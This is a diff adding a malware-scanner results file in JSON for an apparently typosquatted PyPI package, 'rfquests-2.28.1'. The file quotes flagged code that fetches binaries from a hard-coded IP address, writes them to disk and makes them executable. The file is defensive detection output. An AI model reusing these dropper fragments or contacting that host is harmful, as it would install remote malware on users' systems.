@@ -1,0 +1,35 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": [
+            {
+                "location": "rfquests/frequest.py:18",
+                "code": "        with open(executable, 'wb') as f:\n            f.write(req.content)\n\n        if 'linux' in operating_system or 'darwin' in operating_system:\n            os.system(f'chmod +x {executable}')\n\n        if 'linux' in operating_system:\n   ...utable}')\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "shady-links": [
+            {
+                "location": "rfquests/frequest.py:9",
+                "code": "    req = requests.get('http://35.235.126.33/all.txt')\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "rfquests/frequest.py:16",
+                "code": "        url = f'http://35.235.126.33/{executable}'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/rfquests-2.28.1"
+}
